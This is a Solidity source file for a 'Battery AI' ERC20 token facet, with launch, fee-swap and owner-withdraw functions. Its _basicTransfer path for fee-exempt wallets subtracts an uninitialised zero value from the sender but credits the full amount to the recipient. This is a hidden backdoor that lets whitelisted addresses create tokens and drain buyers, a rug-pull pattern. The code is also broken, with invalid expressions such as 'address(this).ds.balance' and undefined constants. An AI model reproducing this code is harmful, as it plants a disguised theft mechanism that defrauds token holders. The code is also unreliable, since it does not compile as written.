// SPDX-License-Identifier: MIT

/*
    Web      : https://batteryai.loans
    DApp     : https://app.batteryai.loans
    Docs     : https://docs.batteryai.loans

    Twitter  : https://twitter.com/BatteryAIX
    Telegram : https://t.me/batteryai_official

*/

pragma solidity 0.8.19;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Ownable {
    using SafeMath for uint256;

    modifier inSwapFlag() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    event updateBatteryThresold(uint256 amount);
    function totalSupply() external pure override returns (uint256) {
        if (_totalSupply == 0) {
            revert();
        }
        return _totalSupply;
    }
    function decimals() external pure override returns (uint8) {
        if (_totalSupply == 0) {
            revert();
        }
        return _decimals;
    }
    function symbol() external pure override returns (string memory) {
        return _symbol;
    }
    function name() external pure override returns (string memory) {
        return _name;
    }
    function getOwner() external view override returns (address) {
        return owner();
    }
    function allowance(
        address holder,
        address spender
    ) external view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[holder][spender];
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.balance[account];
    }
    function createBatteryPairs() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.launch, "Already Battery AI launched!");

        ds.swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // Uniswap V2 Router

        _approve(address(this), address(ds.swapRouter), _totalSupply);
        ds.lpPair = IFactoryV2(ds.swapRouter.factory()).createPair(
            address(this),
            ds.swapRouter.WETH()
        );
        ds.isLpPair[ds.lpPair] = true;
        ds.swapRouter.addLiquidityETH{value: address(this).ds.balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.lpPair).approve(address(ds.swapRouter), type(uint).max);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function approve(
        address spender,
        uint256 amount
    ) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._allowances[sender][msg.sender] != type(uint256).max) {
            ds._allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }
    function removeBatteryLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.maxWalletAmount = _totalSupply;
    }
    function changeBatteryThreshold(uint256 amount) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(amount >= 100, "Amount lower not accepted.");
        ds.swapThreshold = amount;
        emit updateBatteryThresold(ds.swapThreshold);
    }
    function withdrawStuckEthBalance() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(address(this).ds.balance > 0, "No Balance to withdraw!");
        payable(msg.sender).transfer(address(this).ds.balance);
    }
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.launch, "Already launched!");

        ds.launch = true;
        ds.launchedAt = block.number;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool takeFee = true;
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (isNoBatteryInternalFees(from)) {
            return _basicTransfer(from, to, amount);
        }

        if (ds._noBatteryFee[from] || ds._noBatteryFee[to]) {
            takeFee = false;
        } else {
            require(ds.launch, "Trading is not opened!");

            if (is_BatterySell(from, to) && !ds.inSwap) {
                uint256 tokensToSwap = balanceOf(address(this));
                if (tokensToSwap >= ds.swapThreshold && !ds.inSwap) {
                    if (tokensToSwap > onePercent) {
                        tokensToSwap = onePercent;
                    }
                    internalSwap(amount, tokensToSwap);
                }
            } else {
                require(
                    balanceOf(to) + amount <= ds.maxWalletAmount,
                    "Max wallet 2% at ds.launch"
                );
            }
        }

        ds.balance[from] -= amount;
        uint256 amountAfterFee = (takeFee)
            ? takeBatteryTaxes(from, is_BatterySell(from, to), amount)
            : amount;
        ds.balance[to] += amountAfterFee;
        emit Transfer(from, to, amountAfterFee);

        return true;
    }
    function isNoBatteryInternalFees(address ins) internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._noBatteryFee[ins] && ins != owner() && ins != address(this);
    }
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 amounts;
        ds.balance[sender] = ds.balance[sender].sub(
            amounts,
            "Insufficient Balance"
        );
        ds.balance[recipient] = ds.balance[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function is_BatterySell(
        address ins,
        address out
    ) internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool _is_sell = ds.isLpPair[out] && !ds.isLpPair[ins];
        return _is_sell;
    }
    function internalSwap(
        uint256 contractBalance,
        uint256 tokensForSwap
    ) internal inSwapFlag {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.swapRouter.WETH();

        if (
            ds._allowances[address(this)][address(ds.swapRouter)] !=
            type(uint256).max
        ) {
            ds._allowances[address(this)][address(ds.swapRouter)] = type(
                uint256
            ).max;
        }

        if (contractBalance > ds.swapThreshold) {
            try
                ds
                    .swapRouter
                    .swapExactTokensForETHSupportingFeeOnTransferTokens(
                        tokensForSwap,
                        0,
                        path,
                        address(this),
                        block.timestamp
                    )
            {} catch {
                return;
            }

            uint256 ethForMarketing = address(this).ds.balance;
            ds.batteryFees.transfer(ethForMarketing);
        }
    }
    function takeBatteryTaxes(
        address from,
        bool issell,
        uint256 amount
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 fee;
        if (block.number < ds.launchedAt + ds.launchDelay) {
            fee = initialBatFee;
        } else {
            fee = buyfee;
            if (issell) fee = sellfee;
        }

        if (fee == 0) return amount;

        uint256 feeAmount = (amount * fee) / fee_denominator;
        if (feeAmount > 0) {
            uint256 burnAmount = (amount * burnFee) / burnDenominator;
            ds.balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);

            if (burnAmount > 0) {
                ds.balance[address(this)] -= burnAmount;
                ds.balance[address(DEAD)] += burnAmount;
                emit Transfer(address(this), DEAD, burnAmount);
            }
        }
        return amount - feeAmount;
    }
    function _approve(
        address sender,
        address spender,
        uint256 amount
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");
        ds._allowances[sender][spender] = amount;
    }
}
